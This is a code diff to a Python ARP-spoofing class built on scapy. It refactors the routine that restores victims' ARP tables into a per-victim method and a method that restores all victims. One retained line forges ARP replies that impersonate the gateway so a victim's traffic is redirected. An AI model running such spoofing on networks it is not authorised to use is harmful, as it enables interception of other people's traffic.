@@ -30,7 +30,7 @@ class ARP_spoofer:
         with self.lock:
             self._active = False
         if self.has_spoofed:
-            self.arp_restore()
+            self.arp_restore_all()
         self._thread.join()
         return
 
@@ -50,19 +50,20 @@ class ARP_spoofer:
         # trick victim
         sc.send(sc.ARP(op=2, pdst=ip_victim, hwdst=mac_victim, psrc=ip_gateway, hwsrc=mac_host), verbose=False)
 
-    def arp_restore(self):
-        """Restores ARP table by sending ARP packets with the real MAC addresses to end ARP spoofing"""
-
+    def arp_restore_victim(self, ip_victim):
+        """Restores ARP for a victim"""
         ip_to_mac = self._host_state.get_arp_table()
-        for ip_victim in self.victim_ip_list:
-            mac_victim = ip_to_mac[ip_victim]
-            with self._host_state.lock:
-                ip_gateway = self._host_state.gateway_ip
-                mac_gateway = ip_to_mac[self._host_state.gateway_ip]
-
+        mac_victim = ip_to_mac[ip_victim]
+        with self._host_state.lock:
+            ip_gateway = self._host_state.gateway_ip
+            mac_gateway = ip_to_mac[self._host_state.gateway_ip]
             sc.send(sc.ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_gateway, hwsrc=mac_victim, psrc=ip_victim), verbose=False)
             sc.send(sc.ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_victim, hwsrc=mac_gateway, psrc=ip_gateway), verbose=False)
-        return
+
+    def arp_restore_all(self):
+        """Restores ARP table by sending ARP packets with the real MAC addresses to end ARP spoofing"""
+        for ip_victim in self.victim_ip_list:
+            self.arp_restore_victim(ip_victim)
 
 
 
